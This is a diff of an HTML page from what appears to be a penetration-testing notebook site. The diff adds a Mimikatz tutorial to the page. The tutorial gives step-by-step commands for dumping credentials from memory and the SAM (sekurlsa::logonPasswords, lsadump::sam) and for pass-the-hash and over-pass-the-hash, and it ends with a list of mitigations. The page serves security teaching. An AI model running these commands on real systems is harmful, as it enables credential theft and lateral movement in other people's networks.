@@ -8,7 +8,7 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="viewport" content="width=device-width, initial-scale=1" />
 
-    <title>Pass Attacks with Mimikatz &#8212; MyHackBook</title>
+    <title>Mimikatz &#8212; MyHackBook</title>
   
   
   
@@ -172,11 +172,16 @@
 </details></li>
 <li class="toctree-l3 current active has-children"><a class="reference internal" href="index.html">Post Compromise Attacks</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
 <li class="toctree-l4"><a class="reference internal" href="pass-attacks.html">Pass Attacks</a></li>
-<li class="toctree-l4 current active"><a class="current reference internal" href="#">Pass Attacks with Mimikatz</a></li>
+<li class="toctree-l4 current active"><a class="current reference internal" href="#">Mimikatz</a></li>
 <li class="toctree-l4"><a class="reference internal" href="kerberoasting.html">Kerberoasting</a></li>
 <li class="toctree-l4"><a class="reference internal" href="token-impersonation.html">Token Impersonation</a></li>
 <li class="toctree-l4"><a class="reference internal" href="lnk-file-attacks.html">LNK File Attacks</a></li>
 <li class="toctree-l4"><a class="reference internal" href="gpp-cPassword-attacks.html">GPP cPassword Attacks</a></li>
+</ul>
+</details></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../post-domain-compromise-attacks/index.html">Post Domain Compromise Attacks</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
+<li class="toctree-l4"><a class="reference internal" href="../post-domain-compromise-attacks/ntds-dumping.html">Dumping the NTDS.dit</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../post-domain-compromise-attacks/golden-ticket.html">Golden Ticket</a></li>
 </ul>
 </details></li>
 </ul>
@@ -327,7 +332,9 @@
 <button class="btn btn-sm pst-navbar-icon search-button search-button__button pst-js-only" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
     <i class="fa-solid fa-magnifying-glass fa-lg"></i>
 </button>
-
+<button class="sidebar-toggle secondary-toggle btn btn-sm pst-navbar-icon" title="Toggle secondary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <span class="fa-solid fa-list"></span>
+</button>
 </div></div>
       
     </div>
@@ -338,11 +345,25 @@
               
 
 <div id="jb-print-docs-body" class="onlyprint">
-    <h1>Pass Attacks with Mimikatz</h1>
+    <h1>Mimikatz</h1>
     <!-- Table of contents -->
     <div id="print-main-content">
         <div id="jb-print-toc">
             
+            <div>
+                <h2> Contents </h2>
+            </div>
+            <nav aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#credential-dumping">Credential Dumping</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#walkthrough">Walkthrough</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#pass-the-hash-pth">Pass-the-Hash (PtH)</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#over-pass-the-hash">Over-Pass-the-Hash</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a></li>
+</ul>
+            </nav>
         </div>
     </div>
 </div>
@@ -352,8 +373,94 @@
 <div id="searchbox"></div>
                 <article class="bd-article">
                   
-  <section id="pass-attacks-with-mimikatz">
-<h1>Pass Attacks with Mimikatz<a class="headerlink" href="#pass-attacks-with-mimikatz" title="Link to this heading">#</a></h1>
+  <section id="mimikatz">
+<h1>Mimikatz<a class="headerlink" href="#mimikatz" title="Link to this heading">#</a></h1>
+<ul class="simple">
+<li><p>Mimikatz is a powerful post-exploitation tool used to view and steal credentials, generate Kerberos tickets, and leverage advanced attacks.</p></li>
+<li><p>It can dump credentials stored in memory, including plaintext passwords, password hashes, and Kerberos tickets.</p></li>
+<li><p>Highly detectable by antivirus solutions, but devastating when AV is disabled, bypassed, or the tool is obfuscated.</p></li>
+<li><p>Enables multiple attack vectors: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Silver Ticket, and Golden Ticket attacks.</p></li>
+<li><p>Source: https://github.com/gentilkiwi/mimikatz</p></li>
+</ul>
+<section id="credential-dumping">
+<h2>Credential Dumping<a class="headerlink" href="#credential-dumping" title="Link to this heading">#</a></h2>
+<section id="walkthrough">
+<h3>Walkthrough<a class="headerlink" href="#walkthrough" title="Link to this heading">#</a></h3>
+<ol class="arabic simple">
+<li><p>Transfer Mimikatz to the Victim Machine</p></li>
+</ol>
+<p>Using any file transfer method (e.g., SMB, HTTP, or direct copy), place <code class="docutils literal notranslate"><span class="pre">mimikatz.exe</span></code> on the target system.</p>
+<ol class="arabic simple" start="2">
+<li><p>Execute Mimikatz with Elevated Privileges</p></li>
+</ol>
+<p>Open an elevated command prompt or PowerShell session and run Mimikatz:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mimikatz</span><span class="o">.</span><span class="n">exe</span>
+</pre></div>
+</div>
+<ol class="arabic simple" start="3">
+<li><p>Enable Debug Privileges</p></li>
+</ol>
+<p>Within the Mimikatz prompt, first enable debug privileges to access protected memory:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mimikatz</span> <span class="c1"># privilege::debug</span>
+</pre></div>
+</div>
+<ol class="arabic simple" start="4">
+<li><p>Dump Credentials from Memory</p></li>
+</ol>
+<p>Extract all cached credentials and plaintext passwords stored in memory:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mimikatz</span> <span class="c1"># sekurlsa::logonPasswords</span>
+</pre></div>
+</div>
+<p>This command displays credentials including:</p>
+<ul class="simple">
+<li><p><strong>Plaintext passwords</strong> (if stored by applications like browsers, Remote Desktop, or credential manager)</p></li>
+<li><p><strong>NTLM hashes</strong> of user accounts</p></li>
+<li><p><strong>Kerberos tickets</strong> (TGT and TGS)</p></li>
+<li><p><strong>Plain passwords</strong> from Credential Manager (Credman)</p></li>
+</ul>
+<ol class="arabic simple" start="5">
+<li><p>Extract Additional Credential Stores</p></li>
+</ol>
+<p>Dump credentials from Local Security Authority (LSA):</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mimikatz</span> <span class="c1"># lsadump::sam</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="pass-the-hash-pth">
+<h2>Pass-the-Hash (PtH)<a class="headerlink" href="#pass-the-hash-pth" title="Link to this heading">#</a></h2>
+<p>Once you obtain NTLM hashes, use Mimikatz to inject them into the current session and authenticate as another user without knowing their password:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mimikatz</span> <span class="c1"># sekurlsa::pth /user:&lt;username&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt;</span>
+</pre></div>
+</div>
+<p>This creates a new process running with the stolen hash, allowing lateral movement across the domain.</p>
+</section>
+<section id="over-pass-the-hash">
+<h2>Over-Pass-the-Hash<a class="headerlink" href="#over-pass-the-hash" title="Link to this heading">#</a></h2>
+<p>Request a new Kerberos TGT using the user’s NTLM hash:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mimikatz</span> <span class="c1"># sekurlsa::pth /user:&lt;username&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt; /run:powershell.exe</span>
+</pre></div>
+</div>
+<p>Within the new PowerShell session, request a TGT:</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;kerberos::ask /tgt&quot;&#39;</span>
+</pre></div>
+</div>
+<p>This bypasses password requirements while maintaining Kerberos authentication.</p>
+</section>
+<section id="mitigations">
+<h2>Mitigations<a class="headerlink" href="#mitigations" title="Link to this heading">#</a></h2>
+<ul class="simple">
+<li><p><strong>Endpoint Detection and Response (EDR)</strong>: Deploy EDR solutions that detect Mimikatz execution and credential access patterns at runtime.</p></li>
+<li><p><strong>Disable Unnecessary Services</strong>: Disable services and features that hold plaintext credentials in memory (e.g., WDigest).</p></li>
+<li><p><strong>Credential Guard</strong>: Enable Windows Defender Credential Guard to isolate and protect credentials in memory on Windows 10/11 and Server 2016+.</p></li>
+<li><p><strong>Restrict Administrator Access</strong>: Limit the number of accounts with administrative privileges and implement Just-In-Time (JIT) admin access.</p></li>
+<li><p><strong>Monitor Memory Access</strong>: Use tools like Sysmon to log suspicious memory access and command execution patterns.</p></li>
+<li><p><strong>Patch Regularly</strong>: Apply security patches promptly to address vulnerabilities that Mimikatz exploits.</p></li>
+<li><p><strong>Multi-Factor Authentication (MFA)</strong>: Enforce MFA to prevent Pass-the-Hash and Over-Pass-the-Hash attacks.</p></li>
+<li><p><strong>Audit Kerberos Ticket Requests</strong>: Monitor for unusual TGT and TGS requests that may indicate forged tickets.</p></li>
+<li><p><strong>Protected Accounts</strong>: Place sensitive accounts (e.g., krbtgt, Domain Admins) in the “Protected Users” security group to restrict delegation and impersonation.</p></li>
+</ul>
+</section>
 </section>
 
 
@@ -391,6 +498,29 @@
             </div>
             
             
+              
+                <dialog id="pst-secondary-sidebar-modal"></dialog>
+                <div id="pst-secondary-sidebar" class="bd-sidebar-secondary bd-toc"><div class="sidebar-secondary-items sidebar-secondary__inner">
+
+
+  <div class="sidebar-secondary-item"><div
+    id="pst-page-navigation-heading-2"
+    class="page-toc tocsection onthispage">
+    <i class="fa-solid fa-list"></i> Contents
+  </div>
+  <nav id="pst-page-toc-nav" class="page-toc" aria-labelledby="pst-page-navigation-heading-2">
+    <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#credential-dumping">Credential Dumping</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#walkthrough">Walkthrough</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#pass-the-hash-pth">Pass-the-Hash (PtH)</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#over-pass-the-hash">Over-Pass-the-Hash</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a></li>
+</ul>
+  </nav></div>
+
+</div></div>
               
             
           </div>
